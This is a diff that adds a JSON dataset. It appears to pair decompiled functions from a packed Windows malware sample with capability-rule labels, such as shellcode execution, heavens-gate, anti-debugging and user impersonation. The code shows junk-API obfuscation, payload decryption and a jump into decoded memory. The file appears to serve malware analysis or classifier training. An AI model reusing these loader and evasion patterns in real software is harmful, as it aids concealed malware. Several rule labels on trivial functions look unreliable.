@@ -1,0 +1,163 @@
+{
+    "null": {
+        "rules": [
+            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
+        ],
+        "decompiled_code": "",
+        "token_count": 0
+    },
+    "00403f04": {
+        "rules": [
+            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
+        ],
+        "decompiled_code": "\nvoid __cdecl fcn.00403f04(uint32_t arg_8h)\n\n{\n    fcn.00403ee1();\n    if ((arg_8h & 1) != 0) {\n        fcn.004040cc();\n    }\n    return;\n}\n",
+        "token_count": 59
+    },
+    "0040418d": {
+        "rules": [
+            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
+        ],
+        "decompiled_code": "\nvoid __cdecl fcn.0040418d(uint32_t arg_8h)\n\n{\n    fcn.0040417d();\n    if ((arg_8h & 1) != 0) {\n        fcn.004040cc();\n    }\n    return;\n}\n",
+        "token_count": 59
+    },
+    "00409033": {
+        "rules": [
+            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
+        ],
+        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00409033(uint arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t arg_8h_00;\n    uint uVar3;\n    code *pcVar4;\n    code *pcVar5;\n    uint var_14h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    iVar1 = fcn.0040562a();\n    var_4h = 0;\n    if (*0x4a439c == 0) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x402a34);\n        pcVar4 = _sym.imp.KERNEL32.dll_GetProcAddress;\n        if (iVar2 == 0) {\n            return 0;\n        }\n        arg_8h_00 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, 0x402a28);\n        if (arg_8h_00 == 0) {\n            return 0;\n        }\n        *0x4a439c = fcn.004055b8(arg_8h_00);\n        uVar3 = (*pcVar4)(iVar2, 0x402a18);\n        *0x4a43a0 = fcn.004055b8(uVar3);\n        uVar3 = (*pcVar4)(iVar2, 0x402a04);\n        *0x4a43a4 = fcn.004055b8(uVar3);\n        uVar3 = (*pcVar4)(iVar2, 0x4029e8);\n        *0x4a43ac = fcn.004055b8(uVar3);\n        if (*0x4a43ac != 0) {\n            uVar3 = (*pcVar4)(iVar2, 0x4029d0);\n            *0x4a43a8 = fcn.004055b8(uVar3);\n        }\n    }\n    if ((*0x4a43a8 != iVar1) && (*0x4a43ac != iVar1)) {\n        pcVar4 = fcn.00405633(*0x4a43a8);\n        pcVar5 = fcn.00405633(*0x4a43ac);\n        if (((pcVar4 != NULL) && (pcVar5 != NULL)) &&\n           (((iVar2 = (*pcVar4)(),  iVar2 == 0 || (iVar2 = (*pcVar5)(iVar2, 1, &var_14h, 0xc, &var_8h),  iVar2 == 0)) ||\n            ((var_ch & 1) == 0)))) {\n            arg_10h = arg_10h | 0x200000;\n            goto code_r0x00409175;\n        }\n    }\n    if ((((*0x4a43a0 != iVar1) && (pcVar4 = fcn.00405633(*0x4a43a0),  pcVar4 != NULL)) &&\n        (var_4h = (*pcVar4)(),  var_4h != 0)) &&\n       ((*0x4a43a4 != iVar1 && (pcVar4 = fcn.00405633(*0x4a43a4),  pcVar4 != NULL)))) {\n        var_4h = (*pcVar4)(var_4h);\n    }\ncode_r0x00409175:\n    pcVar4 = fcn.00405633(*0x4a439c);\n    if (pcVar4 == NULL) {\n        return 0;\n    }\n    uVar3 = (*pcVar4)(var_4h, arg_8h, arg_ch, arg_10h);\n    return uVar3;\n}\n",
+        "token_count": 848
+    },
+    "00402dc0": {
+        "rules": [
+            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
+        ],
+        "decompiled_code": "\nvoid fcn.00402dc0(void)\n\n{\n    *0x2bfb1da = 0x6c;\n    *0x2bfb1ce = 0x6d;\n    *0x2bfb1cc = 0x69;\n    *0x2bfb1d0 = 0x67;\n    *0x2bfb1d8 = 100;\n    *0x2bfb1de = 0;\n    *0x2bfb1d2 = 0x33;\n    *0x2bfb1ca = 0x73;\n    *0x2bfb1dc = 0x6c;\n    *0x2bfb1d6 = 0x2e;\n    *0x2bfb1d4 = 0x32;\n    *0x2bfb1c8 = 0x6d;\n    (*_sym.imp.KERNEL32.dll_LoadLibraryW)(0x2bfb1c8);\n    return;\n}\n",
+        "token_count": 225
+    },
+    "00402e70": {
+        "rules": [
+            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc",
+            "check OS version/eb1d2d86c0084793ad233d63869572f1"
+        ],
+        "decompiled_code": "\nvoid __thiscall fcn.00402e70(uint param_1, uint32_t *param_2, uint32_t param_3, uint32_t param_4)\n\n{\n    if (*0x2bfb1c4 == 3) {\n        (*_sym.imp.KERNEL32.dll_CreateMailslotA)(0, 0, 0, 0, param_1);\n        (*_sym.imp.KERNEL32.dll_WaitForMultipleObjects)(0, 0, 0, 0);\n    }\n    *param_2 = param_4 ^ param_3;\n    return;\n}\n",
+        "token_count": 131
+    },
+    "00403ee1": {
+        "rules": [
+            "check OS version/eb1d2d86c0084793ad233d63869572f1",
+            "check OS version/c2d5920d27eb4726b54299bacf904e17",
+            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
+            "check OS version/730896de213f42198ce3af1d0fc93fbe"
+        ],
+        "decompiled_code": "\nvoid __fastcall fcn.00403ee1(uint *param_1)\n\n{\n    *param_1 = 0x401200;\n    if (param_1[2] != 0) {\n        fcn.004048ab(param_1[1]);\n    }\n    return;\n}\n",
+        "token_count": 63
+    },
+    "00404322": {
+        "rules": [
+            "check OS version/eb1d2d86c0084793ad233d63869572f1",
+            "check OS version/eb1d2d86c0084793ad233d63869572f1",
+            "check OS version/c2d5920d27eb4726b54299bacf904e17",
+            "check OS version/c2d5920d27eb4726b54299bacf904e17",
+            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
+            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
+            "check OS version/730896de213f42198ce3af1d0fc93fbe",
+            "check OS version/730896de213f42198ce3af1d0fc93fbe"
+        ],
+        "decompiled_code": "\n// WARNING: Possible PIC construction at 0x00404415: Changing call to branch\n// WARNING: Removing unreachable block (ram,0x0040441a)\n// WARNING: Removing unreachable block (ram,0x00404448)\n// WARNING: Removing unreachable block (ram,0x00404420)\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00404322(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    int32_t unaff_EBP;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.004064e0(0x49b5c8, 0x18);\n    fcn.00406048(8);\n    *(unaff_EBP + -4) = 0;\n    if (*0x4a3d30 != 1) {\n        *0x4a3d2c = 1;\n        *0x4a3d28 = *(unaff_EBP + 0x10);\n        if (*(unaff_EBP + 0xc) == 0) {\n            piVar1 = fcn.00405633(*0x2bfbcb0);\n            *(unaff_EBP + -0x28) = piVar1;\n            if (piVar1 != NULL) {\n                piVar2 = fcn.00405633(*0x2bfbcac);\n                *(unaff_EBP + -0x24) = piVar2;\n                *(unaff_EBP + -0x1c) = piVar1;\n                *(unaff_EBP + -0x20) = piVar2;\n                while( true ) {\n                    piVar2 = piVar2 + -1;\n                    *(unaff_EBP + -0x24) = piVar2;\n                    if (piVar2 < piVar1) break;\n                    iVar3 = fcn.0040562a();\n                    if (*piVar2 != iVar3) {\n                        if (piVar2 < piVar1) break;\n                        pcVar4 = fcn.00405633(*piVar2);\n                        iVar3 = fcn.0040562a();\n                        *piVar2 = iVar3;\n                        (*pcVar4)();\n                        iVar3 = fcn.00405633(*0x2bfbcb0);\n                        piVar1 = fcn.00405633(*0x2bfbcac);\n                        if ((*(unaff_EBP + -0x1c) != iVar3) || (*(unaff_EBP + -0x20) != piVar1)) {\n                            *(unaff_EBP + -0x1c) = iVar3;\n                            *(unaff_EBP + -0x28) = iVar3;\n                            *(unaff_EBP + -0x20) = piVar1;\n                            *(unaff_EBP + -0x24) = piVar1;\n                            piVar2 = piVar1;\n                        }\n                        piVar1 = *(unaff_EBP + -0x28);\n                    }\n                }\n            }\n            fcn.0040425c(0x4011c0);\n        }\n        fcn.0040425c(0x4011c8);\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    if (*(unaff_EBP + 0x10) != 0) {\n        fcn.00405f6e(8);\n    }\n    return;\n}\n",
+        "token_count": 806
+    },
+    "00406a4d": {
+        "rules": [
+            "check OS version/eb1d2d86c0084793ad233d63869572f1",
+            "check OS version/eb1d2d86c0084793ad233d63869572f1",
+            "check OS version/c2d5920d27eb4726b54299bacf904e17",
+            "check OS version/c2d5920d27eb4726b54299bacf904e17",
+            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
+            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
+            "check OS version/730896de213f42198ce3af1d0fc93fbe",
+            "check OS version/730896de213f42198ce3af1d0fc93fbe"
+        ],
+        "decompiled_code": "\nvoid fcn.00406a4d(void)\n\n{\n    int32_t unaff_EBP;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x1c) != 0) {\n        fcn.00405f6e(0);\n    }\n    return;\n}\n",
+        "token_count": 67
+    },
+    "00408660": {
+        "rules": [
+            "check OS version/eb1d2d86c0084793ad233d63869572f1",
+            "check OS version/c2d5920d27eb4726b54299bacf904e17",
+            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
+            "check OS version/730896de213f42198ce3af1d0fc93fbe"
+        ],
+        "decompiled_code": "\nvoid __cdecl fcn.00408660(uint arg_8h)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    int32_t in_ECX;\n    uint in_EDX;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    ushort in_ES;\n    ushort in_CS;\n    ushort in_SS;\n    ushort in_DS;\n    ushort in_FS;\n    ushort in_GS;\n    uint8_t in_AF;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uint unaff_retaddr;\n    int32_t var_328h;\n    uint var_324h;\n    uint var_320h;\n    \n    if (in_ECX == *0x49da30) {\n        return;\n    }\n    *0x4a44c8 = (in_NT & 1) * 0x4000 | SBORROW4(&stack0xfffffffc, 0x328) * 0x800 | (in_IF & 1) * 0x200 |\n                (in_TF & 1) * 0x100 | (&var_328h < 0) * 0x80 | (*0x10 == 0x32c) * 0x40 | (in_AF & 1) * 0x10 |\n                ((POPCOUNT(&var_328h & 0xff) & 1U) == 0) * 4 | &stack0xfffffffc < 0x328 | (in_ID & 1) * 0x200000 |\n                (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000;\n    *0x4a44cc = &arg_8h;\n    *0x4a4408 = 0x10001;\n    *0x4a43b0 = 0xc0000409;\n    *0x4a43b4 = 1;\n    var_328h = *0x49da30;\n    var_324h = *0x49da34;\n    *0x4a43bc = unaff_retaddr;\n    *0x4a4494 = in_GS;\n    *0x4a4498 = in_FS;\n    *0x4a449c = in_ES;\n    *0x4a44a0 = in_DS;\n    *0x4a44a4 = unaff_EDI;\n    *0x4a44a8 = unaff_ESI;\n    *0x4a44ac = unaff_EBX;\n    *0x4a44b0 = in_EDX;\n    *0x4a44b4 = in_ECX;\n    *0x4a44b8 = in_EAX;\n    *0x4a44bc = unaff_EBP;\n    *0x4a44c0 = unaff_retaddr;\n    *0x4a44c4 = in_CS;\n    *0x4a44d0 = in_SS;\n    *0x4a4400 = (*_sym.imp.KERNEL32.dll_IsDebuggerPresent)();\n    fcn.004091e7(1);\n    (*_sym.imp.KERNEL32.dll_SetUnhandledExceptionFilter)(0);\n    (*_sym.imp.KERNEL32.dll_UnhandledExceptionFilter)(0x402a40);\n    if (*0x4a4400 == 0) {\n        fcn.004091e7(1);\n    }\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0xc0000409);\n    (*_sym.imp.KERNEL32.dll_TerminateProcess)(uVar1);\n    return;\n}\n",
+        "token_count": 859
+    },
+    "00402ee0": {
+        "rules": [
+            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
+        ],
+        "decompiled_code": "\nvoid fcn.00402ee0(uint32_t *param_1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t unaff_ESI;\n    uint32_t uVar3;\n    uint32_t uStack312;\n    uchar auStack288 [4];\n    uchar auStack284 [276];\n    uint32_t *puStack8;\n    \n    uVar2 = param_1[1];\n    uVar3 = *param_1;\n    fcn.00402ec0();\n    uStack312 = uVar3;\n    iVar1 = *0x49dcb0;\n    if (*0x2bfb1c4 == 0x14) {\n        (*_sym.imp.KERNEL32.dll_GetCPInfoExA)(0, 0, auStack284);\n        iVar1 = *0x49dcb0;\n    }\n    do {\n        if (*0x2bfb1c4 == 0xfa9) {\n            *0x2bfb1c0 = 0xedeb2e40;\n        }\n        else if (*0x2bfb1c4 == 0x3eb) {\n            *0x2bfb134 = 0;\n        }\n        *0x2bfb1bc = 0xf4ea3dee;\n        fcn.00402ed0();\n        if (*0x2bfb1c4 == 0x9e6) {\n            (*_sym.imp.KERNEL32.dll_UnlockFile)(0, 0, 0, 0, 0);\n        }\n        uVar2 = uVar2 - (uVar3 >> 5 ^ uVar3 * 0x10 + iVar1 ^ uStack312 + 0x23f);\n        if (*0x2bfb1c4 == 0xc) {\n            (*_sym.imp.KERNEL32.dll_WriteConsoleA)(0, 0, 0, auStack288, 0);\n        }\n        fcn.00402e60();\n        if (*0x2bfb1c4 == 0x121) {\n            (*_sym.imp.KERNEL32.dll_OpenEventW)(0, 0, 0);\n        }\n        fcn.00402e70();\n        uVar3 = uVar3 - unaff_ESI;\n        uStack312 = uVar2;\n    } while (uVar2 != 0xfffffdc2);\n    *puStack8 = uVar3;\n    puStack8[1] = 0xfffffdc2;\n    return;\n}\n",
+        "token_count": 553
+    },
+    "004030c0": {
+        "rules": [
+            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
+            "hash data using aphash/10489b186fc44711a1078750698db7a9"
+        ],
+        "decompiled_code": "\nvoid fcn.004030c0(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    code *pcVar3;\n    code *pcVar4;\n    uint uStack3160;\n    uint uStack3156;\n    uint uStack3152;\n    uint uStack3148;\n    uint uStack3144;\n    uint uStack3140;\n    uint uStack3136;\n    uint uStack3132;\n    uint uStack3128;\n    uint uStack3124;\n    uint uStack3120;\n    uint uStack3116;\n    uint uStack3112;\n    uint uStack3108;\n    uchar *puStack3104;\n    uint uStack3100;\n    int32_t iStack3080;\n    uchar auStack2048 [2048];\n    \n    pcVar4 = _sym.imp.KERNEL32.dll_LoadLibraryA;\n    pcVar3 = _sym.imp.KERNEL32.dll_WriteProfileSectionA;\n    pcVar2 = _sym.imp.KERNEL32.dll_GetLogicalDrives;\n    pcVar1 = _sym.imp.KERNEL32.dll_FindNextVolumeW;\n    if (*0x2bfb1c4 >> 3 != 0) {\n        iStack3080 = *0x2bfb138;\n        do {\n            if (*0x2bfb1c4 == 0x959) {\n                uStack3100 = 0x403112;\n                (*pcVar2)();\n                uStack3100 = 0;\n                puStack3104 = &stack0xfffff800;\n                uStack3108 = 0;\n                uStack3112 = 0x403120;\n                (*pcVar1)();\n                uStack3112 = 0;\n                uStack3116 = 0;\n                uStack3120 = 0x403126;\n                (*pcVar3)();\n                uStack3120 = 0;\n                uStack3124 = 0x40312a;\n                (*pcVar4)();\n                uStack3124 = 0;\n                uStack3128 = 0;\n                uStack3132 = 0;\n                uStack3136 = 0;\n                uStack3140 = 0x403138;\n                (*_sym.imp.KERNEL32.dll_EnumCalendarInfoExA)();\n                uStack3140 = 0;\n                uStack3144 = 0;\n                uStack3148 = 0x403142;\n                (*_sym.imp.KERNEL32.dll_EnumSystemLocalesA)();\n                uStack3148 = 0;\n                uStack3152 = 0;\n                uStack3156 = 0;\n                uStack3160 = 0x40314e;\n                (*_sym.imp.KERNEL32.dll_AddConsoleAliasW)();\n                uStack3160 = 0;\n                (*pcVar3)(0);\n                (*_sym.imp.KERNEL32.dll_EnumResourceTypesA)(0, 0, 0);\n                (*_sym.imp.KERNEL32.dll_SetThreadPriorityBoost)(0, 0);\n                (*_sym.imp.KERNEL32.dll_GetConsoleTitleA)(&stack0xfffff3a8, 0);\n                (*_sym.imp.KERNEL32.dll_BeginUpdateResourceW)(0, 0);\n                (*_sym.imp.KERNEL32.dll_CreateFileA)(0x402ae0, 0, 0, 0, 0, 0, 0);\n                (*_sym.imp.KERNEL32.dll_FindResourceExA)(0, 0x402af8, 0x402af0, 0);\n                (*_sym.imp.KERNEL32.dll_OpenEventW)(0, 0, 0);\n            }\n            puStack3104 = 0x4031c2;\n            fcn.00402ee0();\n            iStack3080 = iStack3080 + -1;\n        } while (iStack3080 != 0);\n    }\n    return;\n}\n",
+        "token_count": 841
+    },
+    "00402ec0": {
+        "rules": [
+            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
+        ],
+        "decompiled_code": "\nvoid fcn.00402ec0(void)\n\n{\n    int32_t *in_EAX;\n    \n    *in_EAX = *in_EAX + -0x3910cb1f;\n    return;\n}\n",
+        "token_count": 46
+    },
+    "00402ed0": {
+        "rules": [
+            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
+        ],
+        "decompiled_code": "\nvoid __fastcall fcn.00402ed0(int32_t param_1)\n\n{\n    int32_t *in_EAX;\n    \n    *in_EAX = *in_EAX + param_1;\n    return;\n}\n",
+        "token_count": 48
+    },
+    "004031e0": {
+        "rules": [
+            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
+        ],
+        "decompiled_code": "\nvoid fcn.004031e0(void)\n\n{\n    return;\n}\n",
+        "token_count": 16
+    },
+    "00403220": {
+        "rules": [
+            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
+            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
+            "contain loop",
+            "get common file path",
+            "resolve function by parsing PE exports",
+            "set thread local storage value",
+            "impersonate user"
+        ],
+        "decompiled_code": "\nvoid fcn.00403220(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    code *pcVar3;\n    code *pcVar4;\n    code *pcVar5;\n    code *pcVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    uint in_stack_00000014;\n    uint in_stack_00000018;\n    uint in_stack_0000001c;\n    uint in_stack_00000020;\n    uint in_stack_00000024;\n    uint in_stack_00000028;\n    uint in_stack_0000002c;\n    uint in_stack_00000030;\n    uint in_stack_00000034;\n    uint in_stack_00000038;\n    uint in_stack_0000003c;\n    uint in_stack_00000040;\n    uint in_stack_00000044;\n    uint in_stack_00000048;\n    uint in_stack_0000004c;\n    uint in_stack_00000050;\n    uint in_stack_00000054;\n    uint in_stack_00000058;\n    uint in_stack_0000005c;\n    uint in_stack_00000060;\n    uint in_stack_00000064;\n    uint in_stack_00000068;\n    uint in_stack_0000006c;\n    uint in_stack_00000070;\n    uint in_stack_00000074;\n    uint in_stack_00000078;\n    uint in_stack_0000007c;\n    uint in_stack_00000080;\n    uint in_stack_00000084;\n    uint in_stack_00000088;\n    uint in_stack_0000008c;\n    uint in_stack_00000090;\n    uint in_stack_00000094;\n    uint in_stack_00000098;\n    uint in_stack_0000009c;\n    uint in_stack_000000a0;\n    uint in_stack_000000a4;\n    uint in_stack_000000a8;\n    uint in_stack_000000ac;\n    uint in_stack_000000b0;\n    uint in_stack_000000b4;\n    uint in_stack_000000b8;\n    uint in_stack_000000bc;\n    uint in_stack_000000c0;\n    uint in_stack_000000c4;\n    uint in_stack_000000c8;\n    uint in_stack_000000cc;\n    uint in_stack_000000d0;\n    uint in_stack_000000d4;\n    uint in_stack_000000d8;\n    uint in_stack_000000dc;\n    uint in_stack_000000e0;\n    uint in_stack_000000e4;\n    \n    fcn.0040a240();\n    in_stack_00000064 = 0x17574e1f;\n    in_stack_00000058 = 0x54cbcce0;\n    in_stack_00000024 = 0x23ff2c9d;\n    in_stack_0000002c = 0x3d9c1d15;\n    in_stack_00000040 = 0x5933150b;\n    in_stack_00000028 = 0x799709f1;\n    in_stack_0000006c = 0x11cd58f6;\n    in_stack_0000004c = 0x16f2724e;\n    in_stack_00000034 = 0x7b79887e;\n    in_stack_00000018 = 0x9bbdd77;\n    in_stack_00000044 = 0x7782bf1f;\n    in_stack_00000054 = 0xe83e9d36;\n    in_stack_00000020 = 0x30aa2dda;\n    in_stack_00000038 = 0x8a2bead6;\n    in_stack_00000060 = 0x3ce55c21;\n    in_stack_0000001c = 0x9c1ef870;\n    in_stack_00000030 = 0x1efc3dc4;\n    in_stack_00000068 = 0x1042c645;\n    in_stack_00000070 = 0xb1876ea;\n    in_stack_00000074 = 0xefcd3e77;\n    in_stack_00000014 = 0x8ba2410b;\n    in_stack_0000003c = 0xbc7b1652;\n    in_stack_0000005c = 0x1e5bcdda;\n    in_stack_00000050 = 0x222cfa0e;\n    in_stack_00000048 = 0x957bd00c;\n    if (*0x2bfb1c4 == 0xac) {\n        (*_sym.imp.USER32.dll_RegisterClassW)();\n        (*_sym.imp.KERNEL32.dll_GetStringTypeExW)();\n        (*_sym.imp.USER32.dll_GetWindowLongW)();\n        (*_sym.imp.KERNEL32.dll_EnumTimeFormatsW)();\n        fcn.00403e60();\n        fcn.00403ee1();\n        in_stack_00000014 = 0x402b2c;\n        fcn.00403e71(&stack0x00000014);\n        in_stack_00000088 = 0x402b40;\n        fcn.00403ee1();\n        fcn.00403ec4(0x49dca0);\n        in_stack_00000080 = 0x402b4c;\n        fcn.00403ee1();\n        fcn.00403f25(0);\n        fcn.004040a5(0, 0);\n        fcn.004040d7(0, 0);\n        fcn.00403f25(0);\n        fcn.00403f3b(0, 0);\n        fcn.00403f54();\n        fcn.0040444e(0);\n    }\n    pcVar4 = _sym.imp.USER32.dll_CharLowerBuffW;\n    pcVar3 = _sym.imp.USER32.dll_SetCaretPos;\n    pcVar2 = _sym.imp.GDI32.dll_GetCharABCWidthsI;\n    iVar7 = 0;\n    do {\n        if (iVar7 < 0xda6a) {\n            (*pcVar3)();\n            (*pcVar4)();\n            (*pcVar2)();\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x140d7);\n    *0x2bfb1c4 = *0x2bfb1c4 + 0x11b1b;\n    fcn.00403200();\n    (*_sym.imp.KERNEL32.dll_VirtualProtect)();\n    pcVar4 = _sym.imp.KERNEL32.dll_CreateMemoryResourceNotification;\n    pcVar3 = _sym.imp.KERNEL32.dll_GetModuleHandleW;\n    pcVar2 = _sym.imp.GDI32.dll_SetColorAdjustment;\n    uVar8 = 0;\n    if (*0x2bfb1c4 != 0) {\n        do {\n            (*0x2bfb138)[uVar8] = *(uVar8 + 0x11b1b + *0x2bfbb64);\n            if (*0x2bfb1c4 == 0xa8) {\n                (*pcVar4)();\n                (*pcVar3)();\n                (*pcVar2)();\n                (*_sym.imp.ADVAPI32.dll_LogonUserA)();\n                (*_sym.imp.KERNEL32.dll_GetConsoleAliasesLengthW)();\n            }\n            uVar8 = uVar8 + 1;\n        } while (uVar8 < *0x2bfb1c4);\n    }\n    pcVar4 = _sym.imp.KERNEL32.dll_AddConsoleAliasA;\n    pcVar3 = _sym.imp.KERNEL32.dll_GetCPInfoExA;\n    pcVar2 = _sym.imp.KERNEL32.dll_WriteConsoleA;\n    iVar7 = 0;\n    do {\n        if (iVar7 + *0x2bfb1c4 == 0xe) {\n            (*pcVar2)();\n            (*pcVar4)();\n            (*pcVar3)();\n        }\n        pcVar1 = _sym.imp.GDI32.dll_GetCharWidthW;\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x4f9413);\n    iVar7 = 0x4f4;\n    do {\n        (*pcVar1)();\n        pcVar2 = _sym.imp.KERNEL32.dll_SetLastError;\n        iVar7 = iVar7 + -1;\n    } while (iVar7 != 0);\n    do {\n        (*pcVar2)();\n        if (iVar7 < 0x3b9f9c7) {\n            in_stack_00000098 = 0x1b1f4c31;\n            in_stack_000000d4 = 0x62549a1c;\n            in_stack_000000b0 = 0x71b2ec6;\n            in_stack_00000088 = 0x37beb127;\n            in_stack_00000090 = 0x5f430172;\n            in_stack_000000c4 = 0x3ef75990;\n            in_stack_000000e4 = 0x671b5d09;\n            in_stack_00000068 = 0x12f2d2f6;\n            in_stack_00000094 = 0x2e853ae6;\n            in_stack_000000cc = 0x52c4b444;\n            in_stack_000000d0 = 0x46a518f9;\n            in_stack_000000c8 = 0x35125e2b;\n            in_stack_000000bc = 0x1ad10849;\n            in_stack_000000b4 = 0x381ee696;\n            in_stack_000000a4 = 0xe11e6c2;\n            in_stack_000000b8 = 0x5a39ca87;\n            in_stack_000000dc = 0xc687888b;\n            in_stack_00000080 = 0x860776d9;\n            in_stack_00000078 = 0x5e38854d;\n            in_stack_00000084 = 0xae3c1051;\n            in_stack_0000008c = 0x11a722d3;\n            in_stack_000000d8 = 0x43bb0286;\n            in_stack_000000c0 = 0xbc2138cd;\n            in_stack_0000009c = 0xaf698675;\n            in_stack_000000ac = 0xc6aa655c;\n            in_stack_000000a8 = 0x187691d1;\n            in_stack_0000007c = 0xf250e268;\n            in_stack_000000a0 = 0xe5da3acd;\n            in_stack_000000e0 = 0x7914cc58;\n        }\n    } while ((iVar7 < 0xbf08be) && (iVar7 = iVar7 + 1,  iVar7 < 0x19be898c));\n    fcn.004030c0();\n    fcn.004031e0();\n    pcVar3 = _sym.imp.KERNEL32.dll_GetFileAttributesW;\n    pcVar2 = _sym.imp.KERNEL32.dll_EnumTimeFormatsA;\n    iVar7 = 0x7b;\n    do {\n        if (*0x2bfb1c4 == 0x86) {\n            (*pcVar3)();\n            (*pcVar2)();\n        }\n        pcVar6 = _sym.imp.KERNEL32.dll_GetWindowsDirectoryW;\n        pcVar5 = _sym.imp.KERNEL32.dll_GetProfileIntA;\n        pcVar1 = _sym.imp.KERNEL32.dll_TlsSetValue;\n        pcVar4 = _sym.imp.KERNEL32.dll_GetWindowsDirectoryA;\n        iVar7 = iVar7 + -1;\n    } while (iVar7 != 0);\n    iVar7 = 0x180ef;\n    do {\n        if (*0x2bfb1c4 == 0x1f) {\n            (*pcVar6)();\n            (*pcVar4)();\n            (*pcVar1)();\n            (*pcVar5)();\n        }\n        iVar7 = iVar7 + -1;\n    } while (iVar7 != 0);\n    fcn.00402dc0();\n    *0x2bfb13c = *0x2bfb138;\n    (**0x2bfb138)();\n    return;\n}\n",
+        "token_count": 2716
+    },
+    "0040444e": {
+        "rules": [
+            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
+        ],
+        "decompiled_code": "\nvoid __cdecl fcn.0040444e(uint arg_8h)\n\n{\n    fcn.00404322(arg_8h, 0, 0);\n    return;\n}\n",
+        "token_count": 40
+    },
+    "00406316": {
+        "rules": [
+            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
+        ],
+        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040632a)\n// WARNING: Removing unreachable block (ram,0x00406330)\n// WARNING: Removing unreachable block (ram,0x00406332)\n\nvoid fcn.00406316(void)\n\n{\n    return;\n}\n",
+        "token_count": 61
+    },
+    "00405be2": {
+        "rules": [
+            "contain loop"
+        ],
+        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00405be2(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *arg_8h_00;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.004064e0(0x49b700, 0xc);\n    fcn.00406048(0xe);\n    *(unaff_EBP + -4) = 0;\n    arg_8h_00 = *0x4a3d94;\n    iVar1 = *(unaff_EBP + 8);\n    iVar2 = *(iVar1 + 4);\n    if (iVar2 != 0) {\n        piVar3 = 0x4a3d90;\n        do {\n            piVar4 = piVar3;\n            *(unaff_EBP + -0x1c) = arg_8h_00;\n            if (arg_8h_00 == NULL) goto code_r0x00405c26;\n            piVar3 = arg_8h_00;\n        } while (*arg_8h_00 != iVar2);\n        piVar4[1] = arg_8h_00[1];\n        fcn.004048ab(arg_8h_00);\ncode_r0x00405c26:\n        fcn.004048ab(*(iVar1 + 4));\n        *(iVar1 + 4) = 0;\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.00405c49();\n    fcn.00406525();\n    return;\n}\n",
+        "token_count": 397
+    }
+}
